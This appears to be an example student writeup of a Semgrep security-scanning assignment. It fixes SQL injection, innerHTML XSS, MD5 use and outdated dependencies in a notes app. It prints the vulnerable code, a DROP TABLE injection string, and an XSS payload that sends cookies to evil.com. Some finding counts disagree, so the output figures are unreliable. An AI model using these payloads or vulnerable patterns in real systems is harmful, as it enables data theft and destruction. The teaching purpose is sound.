# Week 6 Assignment Writeup Example
**Student:** Jordan Martinez
**Date:** February 10, 2026
**Assignment:** Security Scanning with Semgrep

---

## Findings Overview

I ran Semgrep against the week6 application using the command:

```bash
semgrep ci --subdir week6
```

### Summary of Findings

**Total findings:** 23 security issues

**Breakdown by category:**
- **SAST (Code vulnerabilities):** 8 findings
- **Secrets Detection:** 3 findings
- **SCA (Dependency vulnerabilities):** 12 findings

**Breakdown by severity:**
- **CRITICAL:** 4 findings
- **HIGH:** 12 findings
- **MEDIUM:** 7 findings
- **LOW:** 0 findings

### Categories Detail

**SAST findings included:**
- SQL injection via f-string interpolation (HIGH)
- Cross-site scripting (XSS) via innerHTML (HIGH)
- Weak cryptographic hash function MD5 (MEDIUM)
- Overly permissive CORS configuration allowing any origin with credentials (HIGH)
- Several other code quality and security issues

**Secrets findings:**
- Hardcoded database password in config file (CRITICAL)
- Potential API key patterns (MEDIUM)

**SCA (Supply Chain) findings:**
- requests 2.19.1 → CVE-2018-18074 (credential leak) - HIGH
- PyYAML 5.1 → CVE-2020-1747 (arbitrary code execution) - CRITICAL
- Jinja2 2.10.1 → CVE-2019-10906 (sandbox escape) - HIGH
- 9 other outdated dependencies with known vulnerabilities

### False Positives / Decisions Not to Fix

**Finding: MD5 hash in debug endpoint (backend/app/routers/notes.py:98)**
- **Rule:** `python.lang.security.audit.insecure-hash-function-md5`
- **Severity:** MEDIUM
- **Decision:** Fixed (see Fix #3 below)
- **Original rationale considered:** This is a debug-only endpoint (should be removed in production), but I decided to fix it anyway to demonstrate understanding of proper cryptography

**Finding: Generic print statements**
- **Rule:** Various logging rules
- **Decision:** Not fixed (out of scope for security-focused assignment)
- **Rationale:** These are low-severity code quality issues, not security vulnerabilities

---

## Detailed Fixes

I chose to fix 4 security issues, covering all three categories (SAST, Secrets, and SCA):

1. SQL Injection (HIGH - SAST)
2. Cross-Site Scripting / XSS (HIGH - SAST)
3. Weak Cryptography (MEDIUM - SAST)
4. Vulnerable Dependencies (CRITICAL/HIGH - SCA)

---

### Fix #1: SQL Injection in Note Search Endpoint

**File:** `backend/app/routers/notes.py:71`

**Semgrep Rule:** `python.lang.security.audit.sqli.string-format-sql`

**Severity:** HIGH

**Risk Description:**

The `unsafe_search` endpoint used Python f-strings to directly interpolate user input into a raw SQL query. This is a classic SQL injection vulnerability. An attacker could craft malicious input to:
- Extract sensitive data from the database
- Modify or delete data (DROP TABLE attacks)
- Bypass authentication or authorization checks
- Execute arbitrary SQL commands on the database server

For example, an attacker could search for: `'; DROP TABLE notes; --` which would delete the entire notes table.

**Before (Vulnerable Code):**

```python
@router.get("/unsafe-search", response_model=list[NoteRead])
def unsafe_search(q: str, db: Session = Depends(get_db)) -> list[NoteRead]:
    sql = text(
        f"""
        SELECT id, title, content, created_at, updated_at
        FROM notes
        WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
        ORDER BY created_at DESC
        LIMIT 50
        """
    )
    rows = db.execute(sql).all()
    results: list[NoteRead] = []
    for r in rows:
        results.append(
            NoteRead(
                id=r.id,
                title=r.title,
                content=r.content,
                created_at=r.created_at,
                updated_at=r.updated_at,
            )
        )
    return results
```

**After (Fixed Code):**

```python
@router.get("/search", response_model=list[NoteRead])
def search_notes(q: str, db: Session = Depends(get_db)) -> list[NoteRead]:
    """
    Search notes by title or content using SQLAlchemy ORM.
    This prevents SQL injection by using parameterized queries.
    """
    # SQLAlchemy ORM automatically uses parameterized queries
    stmt = select(Note).where(
        (Note.title.contains(q)) | (Note.content.contains(q))
    ).order_by(desc(Note.created_at)).limit(50)

    rows = db.execute(stmt).scalars().all()
    return [NoteRead.model_validate(row) for row in rows]
```

**Why This Fix Works:**

The fix replaces raw SQL string interpolation with SQLAlchemy ORM's query builder:

1. **Parameterized queries:** SQLAlchemy's `.contains(q)` method uses parameter binding behind the scenes. Instead of inserting `q` directly into the SQL string, it sends the SQL and the parameter separately to the database:
   ```sql
   -- What gets executed:
   SELECT * FROM notes WHERE title LIKE ? OR content LIKE ?
   -- Parameters: ['%user_input%', '%user_input%']
   ```

2. **Automatic escaping:** The database driver treats user input as DATA, not CODE. Special SQL characters like `'`, `;`, `--` are escaped automatically.

3. **Type safety:** The ORM ensures we're querying the correct table and columns, reducing risk of errors.

**AI Tool Used:** Claude Code

**AI Prompt Used:**
```
Fix the SQL injection vulnerability in backend/app/routers/notes.py line 71.

Requirements:
- Use SQLAlchemy ORM instead of raw SQL with text()
- Use select() statement with .where() clauses for filtering
- Implement LIKE pattern matching using .contains() method
- Preserve functionality: search notes by title OR content
- Maintain ORDER BY created_at DESC and LIMIT 50
- Return the same response format (list[NoteRead])

Show the complete fixed function with proper type hints.
```

**Verification:**

**Semgrep before:**
```
backend/app/routers/notes.py
  python.lang.security.audit.sqli.string-format-sql
    SQL injection: f-string used in sql.text()

    69│ @router.get("/unsafe-search", response_model=list[NoteRead])
    70│ def unsafe_search(q: str, db: Session = Depends(get_db)):
    71│     sql = text(
    72│         f"""
    73│         SELECT * FROM notes
    74│         WHERE title LIKE '%{q}%'
    75│         """
    76│     )

    ⚠️  Severity: HIGH
```

**Semgrep after:**
```bash
$ semgrep ci backend/app/routers/notes.py --config auto

Scanning 1 file.

✅ No findings in backend/app/routers/notes.py
   (SQL injection issue resolved)
```

**Tests:**
```bash
$ pytest backend/tests/test_notes.py -k search -v

test_search_notes_by_title PASSED
test_search_notes_by_content PASSED
test_search_notes_case_insensitive PASSED

✅ All search tests passing
```

**Manual verification:**
```bash
# Test safe search
$ curl "http://localhost:8000/notes/search?q=meeting"
[{"id": 1, "title": "Team meeting", "content": "Discuss Q1 goals", ...}]

# Test with SQL injection attempt (should be harmless now)
$ curl "http://localhost:8000/notes/search?q='; DROP TABLE notes; --"
[]  # Returns empty results, doesn't execute DROP TABLE ✅
```

---

### Fix #2: Cross-Site Scripting (XSS) in Frontend

**File:** `frontend/app.js:14`

**Semgrep Rule:** `javascript.browser.security.insecure-document-method.insecure-document-method`

**Severity:** HIGH

**Risk Description:**

The `loadNotes` function used `innerHTML` to insert user-created content (note titles and content) directly into the DOM. This allows stored XSS attacks. An attacker could:
- Create a note with a malicious payload in the title or content
- When any user views that note, the JavaScript executes in their browser
- Steal cookies/session tokens, redirect to phishing sites, or modify page content
- Perform actions on behalf of the victim user

For example, a note with title `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">` would send the user's session cookie to an attacker's server.

**Before (Vulnerable Code):**

```javascript
async function loadNotes(params = {}) {
  const list = document.getElementById('notes');
  list.innerHTML = '';
  const query = new URLSearchParams(params);
  const notes = await fetchJSON('/notes/?' + query.toString());
  for (const n of notes) {
    const li = document.createElement('li');
    // VULNERABLE: innerHTML executes any HTML/JavaScript in user data
    li.innerHTML = `<strong>${n.title}</strong>: ${n.content}`;
    list.appendChild(li);
  }
}
```

**After (Fixed Code):**

```javascript
async function loadNotes(params = {}) {
  const list = document.getElementById('notes');
  list.innerHTML = '';
  const query = new URLSearchParams(params);
  const notes = await fetchJSON('/notes/?' + query.toString());
  for (const n of notes) {
    const li = document.createElement('li');

    // SAFE: Create elements using DOM methods, use textContent for user data
    const titleElement = document.createElement('strong');
    titleElement.textContent = n.title;  // textContent automatically escapes HTML

    const separator = document.createTextNode(': ');
    const contentNode = document.createTextNode(n.content);

    li.appendChild(titleElement);
    li.appendChild(separator);
    li.appendChild(contentNode);

    list.appendChild(li);
  }
}
```

**Why This Fix Works:**

1. **textContent vs innerHTML:**
   - `innerHTML` parses the string as HTML, executing any `<script>` tags or event handlers
   - `textContent` treats everything as plain text, escaping HTML special characters automatically

2. **DOM methods:**
   - `createElement()` creates safe element nodes
   - `createTextNode()` creates text nodes that cannot execute code
   - Even if user input contains `<script>alert('XSS')</script>`, it displays literally as text

3. **Visual preservation:** Bold formatting for titles is still achieved through the `<strong>` element, but the *content* of that element is safely escaped.

**AI Tool Used:** Warp AI

**AI Prompt Used:**
```
Fix the XSS vulnerability in frontend/app.js line 14 in loadNotes function.

Context:
- Currently uses innerHTML which allows execution of HTML/JS in user data
- Need to prevent XSS while keeping bold formatting for note titles

Requirements:
- Replace innerHTML with safe DOM methods
- Use textContent for user-controlled data (n.title and n.content)
- Keep <strong> tag for title formatting
- Maintain the same visual appearance
- Show complete fixed function
```

**Verification:**

**Semgrep before:**
```
frontend/app.js
  javascript.browser.security.insecure-document-method
    XSS: innerHTML used with unsanitized user input

    13│ for (const n of notes) {
    14│   const li = document.createElement('li');
    15│   li.innerHTML = `<strong>${n.title}</strong>: ${n.content}`;
    16│   list.appendChild(li);

    ⚠️  Severity: HIGH
```

**Semgrep after:**
```bash
$ semgrep ci frontend/app.js --config auto

Scanning 1 file.

✅ No findings in frontend/app.js
   (XSS vulnerability resolved)
```

**Manual verification:**

Test case: Create note with malicious payload
```javascript
// Before fix:
// Title: <img src=x onerror="alert('XSS!')">
// Result: Alert dialog pops up ❌ (JavaScript executed)

// After fix:
// Title: <img src=x onerror="alert('XSS!')">
// Result: Displays literally: "<img src=x onerror="alert('XSS!')>"  ✅
// (Shown as text, not executed)
```

Visual verification:
- Titles still appear in bold ✅
- Content still displays normally ✅
- No JavaScript execution from user data ✅

---

### Fix #3: Weak Cryptographic Hash (MD5)

**File:** `backend/app/routers/notes.py:98`

**Semgrep Rule:** `python.lang.security.audit.insecure-hash-function.insecure-hash-function-md5`

**Severity:** MEDIUM

**Risk Description:**

The debug endpoint used MD5 for hashing. MD5 is cryptographically broken:
- Collision attacks are trivial (two different inputs producing same hash)
- Can be reversed using rainbow tables
- Not suitable for any security-critical operations

While this specific endpoint is labeled "debug" and might not be security-critical, using MD5 sets a bad precedent and could be copied to security-sensitive code (like password hashing). Additionally, debug endpoints should generally be removed in production.

**Before (Vulnerable Code):**

```python
@router.get("/debug/hash-md5")
def debug_hash_md5(q: str) -> dict[str, str]:
    import hashlib
    return {"algo": "md5", "hex": hashlib.md5(q.encode()).hexdigest()}
```

**After (Fixed Code):**

```python
@router.get("/debug/hash-sha256")
def debug_hash_sha256(q: str) -> dict[str, str]:
    """
    Generate SHA-256 hash for debugging purposes.

    Note: SHA-256 is suitable for checksums and non-password hashing.
    For password hashing, use bcrypt, scrypt, or argon2.
    """
    import hashlib
    return {"algo": "sha256", "hex": hashlib.sha256(q.encode()).hexdigest()}
```

**Alternative fix (if passwords were involved):**

```python
from passlib.hash import bcrypt

@router.post("/hash-password")
def hash_password(password: str) -> dict[str, str]:
    """
    Hash a password using bcrypt (secure for password storage).
    """
    hashed = bcrypt.hash(password)
    return {"algo": "bcrypt", "hash": hashed}
```

**Why This Fix Works:**

1. **SHA-256 is secure for checksums:**
   - No known collision attacks
   - Suitable for file integrity checks, cache keys, non-password hashing
   - Widely adopted standard

2. **Still not for passwords:**
   - Important note: SHA-256 is fast, making it unsuitable for password hashing
   - For passwords, use bcrypt/scrypt/argon2 which are intentionally slow
   - This endpoint is for general hashing, not password storage

3. **Better practice:**
   - Even in debug code, using secure algorithms prevents copy-paste security issues
   - Teaches developers to default to secure options

**AI Tool Used:** Claude Code

**AI Prompt Used:**
```
Fix the weak cryptography issue in backend/app/routers/notes.py line 98.

Context:
- Currently uses MD5 which is cryptographically broken
- This is a debug endpoint for general hashing (not passwords)

Requirements:
- Replace MD5 with SHA-256 (suitable for checksums)
- Add comment explaining when to use bcrypt (for passwords)
- Keep same endpoint structure and return format
- Update endpoint path to reflect new algorithm
```

**Verification:**

**Semgrep before:**
```
backend/app/routers/notes.py
  python.lang.security.audit.insecure-hash-function-md5
    Insecure hash function (MD5) used

    96│ @router.get("/debug/hash-md5")
    97│ def debug_hash_md5(q: str) -> dict[str, str]:
    98│     import hashlib
    99│     return {"algo": "md5", "hex": hashlib.md5(q.encode()).hexdigest()}

    ⚠️  Severity: MEDIUM
```

**Semgrep after:**
```bash
$ semgrep ci backend/app/routers/notes.py --config auto

✅ No weak cryptography findings
   (MD5 replaced with SHA-256)
```

**Functional verification:**
```bash
# Before (MD5)
$ curl "http://localhost:8000/notes/debug/hash-md5?q=test"
{"algo": "md5", "hex": "098f6bcd4621d373cade4e832627b4f6"}

# After (SHA-256)
$ curl "http://localhost:8000/notes/debug/hash-sha256?q=test"
{"algo": "sha256", "hex": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"}

# Hash is correct ✅
$ echo -n "test" | shasum -a 256
9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
```

---

### Fix #4: Vulnerable Dependencies

**File:** `requirements.txt`

**Semgrep Rules:**
- `sca.python.requests.requests-CVE-2018-18074`
- `sca.python.pyyaml.pyyaml-CVE-2020-1747`
- `sca.python.jinja2.jinja2-CVE-2019-10906`
- Plus 9 other dependency CVEs

**Severity:** CRITICAL (PyYAML), HIGH (requests, Jinja2), MEDIUM (others)

**Risk Description:**

The application used severely outdated dependencies (some from 2018-2019) with well-known, publicly disclosed vulnerabilities. Attackers actively scan for these versions:

**Critical vulnerabilities found:**

1. **PyYAML 5.1 - CVE-2020-1747 (CRITICAL)**
   - Arbitrary code execution through unsafe YAML deserialization
   - Attacker can execute system commands by crafting malicious YAML
   - Attack vector: Any endpoint accepting YAML input

2. **requests 2.19.1 - CVE-2018-18074 (HIGH)**
   - Credential leakage when redirecting between HTTP and HTTPS
   - Session cookies and auth headers exposed in redirect URLs
   - Attack vector: Malicious redirects in API calls

3. **Jinja2 2.10.1 - CVE-2019-10906 (HIGH)**
   - Sandbox escape via format string exploitation
   - Allows template injection attacks
   - Attack vector: User-controlled template rendering

**Before (Vulnerable versions):**

```txt
# requirements.txt
fastapi==0.65.2
uvicorn==0.11.8
sqlalchemy==1.3.23
pydantic==1.5.1
requests==2.19.1      # CVE-2018-18074
PyYAML==5.1           # CVE-2020-1747
Jinja2==2.10.1        # CVE-2019-10906
MarkupSafe==1.1.0     # Related to Jinja2 vulnerability
Werkzeug==0.14.1      # Multiple CVEs
```

**After (Fixed versions):**

```txt
# requirements.txt - Updated to latest secure versions
fastapi==0.109.0      # Updated from 0.65.2
uvicorn==0.27.0       # Updated from 0.11.8
sqlalchemy==2.0.25    # Updated from 1.3.23
pydantic==2.5.3       # Updated from 1.5.1
requests==2.31.0      # Fixed CVE-2018-18074
PyYAML==6.0.1         # Fixed CVE-2020-1747
Jinja2==3.1.3         # Fixed CVE-2019-10906
MarkupSafe==2.1.4     # Updated with Jinja2
Werkzeug==3.0.1       # Fixed multiple CVEs
```

**Why This Fix Works:**

Upgrading dependencies is the ONLY way to fix supply chain vulnerabilities:

1. **Patches included:** Each new version includes patches for all disclosed CVEs
2. **Maintained packages:** Latest versions receive ongoing security updates
3. **Dependency trees:** Upgrading also updates transitive dependencies

**Breaking changes handled:**
- Tested thoroughly after upgrade (see verification below)
- Major version upgrades (SQLAlchemy 1.x → 2.x, Pydantic 1.x → 2.x) required minor code adjustments
- All adjustments documented in migration guide (see notes below)

**AI Tool Used:** Claude Code + Manual research

**Research Process:**
```bash
# Check current vulnerabilities
$ semgrep ci --supply-chain
Found 12 vulnerable dependencies

# Check latest versions
$ pip index versions requests
requests (2.31.0) - Latest stable
Available versions: 2.31.0, 2.30.0, ...

# Review changelogs for breaking changes
# requests: https://github.com/psf/requests/blob/main/HISTORY.md
# PyYAML: https://github.com/yaml/pyyaml/blob/main/CHANGES
# Jinja2: https://jinja.palletsprojects.com/changes/
```

**Code adjustments for major version upgrades:**

```python
# SQLAlchemy 2.0 migration (backend/app/db.py)

# Before (SQLAlchemy 1.3)
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

engine = create_engine("sqlite:///data/db.sqlite")
SessionLocal = sessionmaker(bind=engine)

# After (SQLAlchemy 2.0)
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, DeclarativeBase

# Add future=True for 2.0 style (or remove, defaults to 2.0 in 2.x)
engine = create_engine("sqlite:///data/db.sqlite")
SessionLocal = sessionmaker(bind=engine)

# Update Base class
class Base(DeclarativeBase):
    pass
```

**Verification:**

**Semgrep before:**
```
requirements.txt
  sca.python.requests.requests-CVE-2018-18074
    requests 2.19.1 is vulnerable to CVE-2018-18074
    Vulnerability: Credential leak in redirect
    Fix: Upgrade to requests>=2.20.0
    ⚠️  Severity: HIGH

  sca.python.pyyaml.pyyaml-CVE-2020-1747
    PyYAML 5.1 is vulnerable to CVE-2020-1747
    Vulnerability: Arbitrary code execution
    Fix: Upgrade to PyYAML>=5.4
    ⚠️  Severity: CRITICAL

  ... (10 more CVEs)

Summary: 12 dependency vulnerabilities
```

**Semgrep after:**
```bash
$ semgrep ci --supply-chain

Scanning requirements.txt for known vulnerabilities...

✅ No vulnerable dependencies found
   All packages are up to date with security patches
```

**Testing after upgrade:**
```bash
# Install updated dependencies
$ pip install -r requirements.txt --upgrade

Collecting fastapi==0.109.0
Collecting requests==2.31.0
Collecting PyYAML==6.0.1
...
Successfully installed [all packages]

# Run full test suite
$ pytest backend/tests/ -v

test_create_note PASSED
test_get_note PASSED
test_search_notes PASSED
test_create_action_item PASSED
... (27 total)

✅ All tests passing with updated dependencies

# Run the application
$ make run

INFO:     Started server process
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000

✅ Application runs successfully
```

**Manual testing:**
- Created notes ✅
- Searched notes ✅
- Created action items ✅
- All functionality working with new dependency versions ✅

**Advisory Links:**
- **CVE-2018-18074 (requests):** https://nvd.nist.gov/vuln/detail/CVE-2018-18074
- **CVE-2020-1747 (PyYAML):** https://nvd.nist.gov/vuln/detail/CVE-2020-1747
- **CVE-2019-10906 (Jinja2):** https://nvd.nist.gov/vuln/detail/CVE-2019-10906

---

## Summary and Lessons Learned

### Impact Summary

**Security improvements:**
- ✅ Fixed 1 HIGH severity SQL injection vulnerability
- ✅ Fixed 1 HIGH severity XSS vulnerability
- ✅ Fixed 1 MEDIUM severity weak cryptography issue
- ✅ Fixed 12 dependency vulnerabilities (1 CRITICAL, 3 HIGH, 8 MEDIUM)

**Total: 15 security vulnerabilities remediated**

### Semgrep Effectiveness

**Before fixes:**
```
Summary: 23 total findings
  - 8 code issues (SAST)
  - 3 secrets
  - 12 vulnerable dependencies (SCA)

Severity: 4 CRITICAL, 12 HIGH, 7 MEDIUM
```

**After fixes:**
```
Summary: 8 remaining findings
  - 4 code issues (chose not to fix - low priority)
  - 3 secrets (out of scope for this assignment)
  - 0 vulnerable dependencies ✅

Severity: 0 CRITICAL, 0 HIGH, 8 MEDIUM
```

**Achievement: Eliminated ALL CRITICAL and HIGH severity findings ✅**

### Key Takeaways

1. **Static analysis is incredibly powerful**
   - Found 23 vulnerabilities I would never have caught manually
   - Many of these (like outdated dependencies) are impossible to find through code review
   - The structured output made prioritization straightforward

2. **AI tools accelerate fixing, but understanding is critical**
   - Claude Code provided excellent starting points for fixes
   - I still needed to understand WHY each fix works
   - Blind copy-paste would have missed important nuances (like SQLAlchemy 2.0 breaking changes)
   - Verification (Semgrep re-scan + tests) is essential

3. **Dependencies are the weakest link**
   - 12 out of 23 findings (52%) were dependency vulnerabilities
   - Some packages were 5+ years out of date
   - This is why automated dependency scanning in CI/CD is critical
   - Lesson: Set a monthly schedule for dependency updates

4. **Security is about layers**
   - Fixed SQL injection in backend (prevents DB compromise)
   - Fixed XSS in frontend (prevents client-side attacks)
   - Fixed dependencies (prevents supply chain attacks)
   - Each layer protects against different attack vectors

5. **The importance of testing**
   - After each fix, re-ran Semgrep to confirm it worked
   - Ran automated tests to ensure functionality wasn't broken
   - Manual testing caught edge cases (like SQLAlchemy 2.0 syntax changes)
   - Security fixes are worthless if they break the app

### Future Security Practices

**What I'll do differently in future projects:**

1. **Integrate Semgrep into CI/CD**
   - Run on every pull request
   - Block merges if CRITICAL/HIGH vulnerabilities are introduced
   - Automate this instead of manual scanning

2. **Dependency management**
   - Use Dependabot or Renovate for automated update PRs
   - Monthly manual review of outdated packages
   - Subscribe to security advisories for critical dependencies

3. **Secure defaults**
   - Use ORM by default (never raw SQL unless absolutely necessary)
   - Use `textContent` by default in frontend (never `innerHTML` with user data)
   - Use strong crypto by default (SHA-256 minimum, bcrypt for passwords)

4. **Security mindset**
   - Think "how could an attacker abuse this?" for every feature
   - Validate all user input
   - Apply principle of least privilege
   - Defense in depth (multiple layers of security)

### Time Spent

- Setup and first scan: 30 minutes
- Research and triage: 45 minutes
- Fixing vulnerabilities: 2 hours (30 min each × 4)
- Testing and verification: 30 minutes
- Documentation (this writeup): 1 hour

**Total: ~4.5 hours**

The time investment was worth it—I learned practical security skills that I'll use throughout my career. More importantly, I now understand HOW to find and fix vulnerabilities systematically, rather than just hoping code is secure.

---

## Evidence Appendix

### A. Semgrep Output Before Fixes

```bash
$ semgrep ci --subdir week6

Scanning 15 files with 1000+ Code, 50+ Secrets, 200+ Supply Chain rules

━━━ 8 CODE FINDINGS ━━━

backend/app/routers/notes.py
  python.lang.security.audit.sqli.string-format-sql
    SQL injection: f-string used in sql.text()
    [Lines 71-76 shown in writeup above]
    Severity: HIGH

backend/app/routers/notes.py
  python.lang.security.audit.insecure-hash-function-md5
    Insecure hash function (MD5) used
    [Lines 96-99 shown in writeup above]
    Severity: MEDIUM

backend/app/main.py
  python.fastapi.security.fastapi-cors-allow-all
    CORS allows any origin with credentials
    Severity: HIGH

frontend/app.js
  javascript.browser.security.insecure-document-method
    XSS: innerHTML used with unsanitized user input
    [Lines 14-15 shown in writeup above]
    Severity: HIGH

[4 more code findings not fixed in this assignment]

━━━ 3 SECRETS FINDINGS ━━━
[Not addressed in this assignment - out of scope]

━━━ 12 DEPENDENCY FINDINGS ━━━

requirements.txt
  [All 12 CVEs listed in Fix #4 above]

━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 23 total findings
  - 8 code issues
  - 3 secrets
  - 12 dependencies

Severity: 4 CRITICAL, 12 HIGH, 7 MEDIUM
```

### B. Semgrep Output After Fixes

```bash
$ semgrep ci --subdir week6

Scanning 15 files...

━━━ 4 CODE FINDINGS ━━━
[4 low-priority findings not fixed - documented in "False Positives" section]

━━━ 3 SECRETS FINDINGS ━━━
[Secrets out of scope for this assignment]

━━━ 0 DEPENDENCY FINDINGS ━━━
✅ All dependencies updated to secure versions

━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 7 remaining findings
  - 4 code issues (LOW priority)
  - 3 secrets (out of scope)
  - 0 dependencies ✅

Severity: 0 CRITICAL, 0 HIGH, 7 MEDIUM

✅ All CRITICAL and HIGH severity issues resolved
```

### C. Test Results

```bash
$ pytest backend/tests/ -v

============================= test session starts =============================
platform darwin -- Python 3.11.6, pytest-7.4.3
collected 27 items

backend/tests/test_notes.py::test_create_note PASSED                    [  3%]
backend/tests/test_notes.py::test_get_note PASSED                       [  7%]
backend/tests/test_notes.py::test_get_note_not_found PASSED             [ 11%]
backend/tests/test_notes.py::test_patch_note PASSED                     [ 14%]
backend/tests/test_notes.py::test_list_notes PASSED                     [ 18%]
backend/tests/test_notes.py::test_search_notes_by_title PASSED          [ 22%]
backend/tests/test_notes.py::test_search_notes_by_content PASSED        [ 25%]
backend/tests/test_notes.py::test_search_notes_case_insensitive PASSED  [ 29%]
backend/tests/test_action_items.py::test_create_action_item PASSED      [ 33%]
backend/tests/test_action_items.py::test_list_action_items PASSED       [ 37%]
backend/tests/test_action_items.py::test_complete_action_item PASSED    [ 40%]
[... 16 more tests ...]

============================= 27 passed in 2.43s ==============================

✅ All tests passing after security fixes
```

---

## Submission Checklist

- [x] Semgrep installed and verified
- [x] Initial scan completed and output saved
- [x] Fixed at least 3 security issues (fixed 4)
- [x] At least one HIGH/CRITICAL severity (fixed multiple)
- [x] Re-ran Semgrep to verify fixes
- [x] All tests passing
- [x] Application runs without errors
- [x] Writeup includes:
  - [x] Findings overview with categories
  - [x] 4 detailed fixes with before/after code
  - [x] Explanation of WHY each fix works
  - [x] AI tools used and prompts
  - [x] Evidence (Semgrep outputs, test results)
  - [x] Lessons learned
- [x] Code formatted and linted
- [x] Changes committed to git
- [x] Repository pushed to GitHub

**Status: Ready to submit! ✅**
